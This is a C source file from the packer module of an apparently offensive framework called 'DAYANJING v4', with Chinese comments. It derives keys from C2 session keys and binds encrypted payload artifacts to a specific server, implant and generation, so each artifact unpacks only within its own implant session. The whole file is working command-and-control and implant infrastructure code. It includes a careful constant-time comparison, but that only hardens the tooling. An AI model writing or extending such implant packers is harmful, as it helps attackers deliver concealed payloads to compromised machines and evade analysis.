/*
 * DAYANJING v4 — 20_packer / bind.c
 *
 * 把制品与 C2 会话绑定：
 *   - 密钥材料取自 02_c2 派生出的会话密钥（k_c2s || k_s2c）
 *   - 绑定上下文 bind_ctx 由调用方序列化（通常是 server_static_id ||
 *     implant_id || generation，或 c2_build_context 的输出）
 *   - bind_id = SHA-256(label || bind_ctx)，写入制品头并纳入 AAD
 *
 * 由此得到两条性质：
 *   1. 只有持有该会话密钥的一侧能解开制品（密钥域分离，与通信密钥不同 info）
 *   2. 制品不能跨会话/跨植入体互换 —— bind_id 不符即报 PK_ERR_BIND，
 *      而不是"解密出一段看起来合理的错误载荷"
 *
 * 有意不引入对 02_c2 的编译依赖：本层只认 16 字节密钥材料 + 不透明上下文，
 * 模块可独立编译。两端联编由调用方（部署器 / 集成测试）完成。
 *
 * 密码学复用 00_crypto 的 HKDF-SHA256 与 SHA-256，不自研第二套。
 */

#include "packer.h"
#include "pack_int.h"

#include <string.h>

#include "crypto_hash.h"
#include "crypto_gcm.h"

static const uint8_t PK_SEED_LABEL[] = "dayanjing:packer:seed:v1";
static const uint8_t PK_BIND_LABEL[] = "dayanjing:packer:bind:v1";

int pk_session_seed(const uint8_t k_c2s[PK_SESSION_KEY_LEN],
                    const uint8_t k_s2c[PK_SESSION_KEY_LEN],
                    const uint8_t *bind_ctx, size_t bind_ctx_len,
                    uint8_t seed[PK_SHA_LEN])
{
    uint8_t  ikm[PK_SESSION_KEY_LEN * 2];
    uint8_t  prk[HKDF_HASH_LEN];
    int      rc;

    if (!k_c2s || !k_s2c || !seed) return PK_ERR_ARG;
    if (bind_ctx_len > 0 && !bind_ctx) return PK_ERR_ARG;

    /* 单向密钥退化会让"两个方向同一个密钥"，削弱分离性 —— 直接拒绝 */
    /* SEC-CMP:DEGENERATE: 拒绝双向同钥，同上。注意：本文件另一处 bind_id 比较已改常量时间（那里 want=SHA256(label||bind_ctx) 才是秘密判据）。 */
    if (memcmp(k_c2s, k_s2c, PK_SESSION_KEY_LEN) == 0) return PK_ERR_DEGEN;

    memcpy(ikm, k_c2s, PK_SESSION_KEY_LEN);
    memcpy(ikm + PK_SESSION_KEY_LEN, k_s2c, PK_SESSION_KEY_LEN);

    /*
     * Extract 以 bind_ctx 为 salt：会话不同则 PRK 不同。
     * bind_ctx 为空时 HKDF 按 RFC 5869 §2.2 使用零盐，仍可用但绑定性下降。
     */
    if (hkdf_extract(bind_ctx, bind_ctx_len, ikm, sizeof(ikm), prk) != HASH_OK)
        return PK_ERR_ARG;

    rc = hkdf_expand(prk, PK_SEED_LABEL, sizeof(PK_SEED_LABEL) - 1u,
                     seed, PK_SHA_LEN);

    memset(ikm, 0, sizeof(ikm));
    memset(prk, 0, sizeof(prk));
    return (rc == HASH_OK) ? PK_OK : PK_ERR_ARG;
}

int pk_bind_id(const uint8_t *bind_ctx, size_t bind_ctx_len,
               uint8_t id[PK_BIND_ID_LEN])
{
    sha256_ctx ctx;

    if (!id) return PK_ERR_ARG;
    if (bind_ctx_len > 0 && !bind_ctx) return PK_ERR_ARG;

    sha256_init(&ctx);
    sha256_update(&ctx, PK_BIND_LABEL, sizeof(PK_BIND_LABEL) - 1u);
    if (bind_ctx_len > 0) sha256_update(&ctx, bind_ctx, bind_ctx_len);
    sha256_final(&ctx, id);
    return PK_OK;
}

int pk_pack_session(const uint8_t *raw, size_t raw_len,
                    const uint8_t k_c2s[PK_SESSION_KEY_LEN],
                    const uint8_t k_s2c[PK_SESSION_KEY_LEN],
                    const uint8_t *bind_ctx, size_t bind_ctx_len,
                    uint8_t *out, size_t *out_len)
{
    uint8_t seed[PK_SHA_LEN];
    uint8_t bid[PK_BIND_ID_LEN];
    int     rc;

    if (!raw || !out || !out_len) return PK_ERR_ARG;
    if (raw_len == 0) return PK_ERR_ARG;

    rc = pk_session_seed(k_c2s, k_s2c, bind_ctx, bind_ctx_len, seed);
    if (rc != PK_OK) return rc;

    rc = pk_bind_id(bind_ctx, bind_ctx_len, bid);
    if (rc != PK_OK) { memset(seed, 0, sizeof(seed)); return rc; }

    rc = pk_pack_core(raw, raw_len, seed, sizeof(seed),
                      PK_VERSION2, bid, 0, NULL, out, out_len);

    memset(seed, 0, sizeof(seed));
    return rc;
}

int pk_unpack_session(const uint8_t *blob, size_t blob_len,
                      const uint8_t k_c2s[PK_SESSION_KEY_LEN],
                      const uint8_t k_s2c[PK_SESSION_KEY_LEN],
                      const uint8_t *bind_ctx, size_t bind_ctx_len,
                      uint8_t *out, size_t *out_len)
{
    uint8_t seed[PK_SHA_LEN];
    uint8_t want[PK_BIND_ID_LEN];
    uint8_t got[PK_BIND_ID_LEN];
    int     rc;

    if (!blob || !out || !out_len) return PK_ERR_ARG;

    /* 先取制品自带的 bind_id，与期望值比对 —— 在动用密钥之前就拒绝错件 */
    rc = pk_artifact_bind_id(blob, blob_len, got);
    if (rc != PK_OK) return rc;

    rc = pk_bind_id(bind_ctx, bind_ctx_len, want);
    if (rc != PK_OK) return rc;

    /*
     * 常量时间比较，不能用 memcmp。
     *
     * got 来自制品（攻击者可选任意值），want = SHA256(PK_BIND_LABEL||bind_ctx)。
     * 函数契约并未要求 bind_ctx 必须是公开值 —— 调用方完全可以拿一个秘密
     * 当绑定上下文。只要 want 有一字节是攻击者算不出来的，逐字节早退的
     * memcmp 就是一个可远程观测的预言机，能逐字节把 want 试出来。
     *
     * 判错的代价不对称：改错成常量时间，代价是几十纳秒；判错成 memcmp，
     * 代价是一个真实的信息泄露口。所以按"可能是秘密"处理。
     */
    if (crypto_constant_time_eq(got, want, PK_BIND_ID_LEN) == 0) return PK_ERR_BIND;

    rc = pk_session_seed(k_c2s, k_s2c, bind_ctx, bind_ctx_len, seed);
    if (rc != PK_OK) return rc;

    rc = pk_unpack_core(blob, blob_len, seed, sizeof(seed), out, out_len);

    memset(seed, 0, sizeof(seed));
    return rc;
}
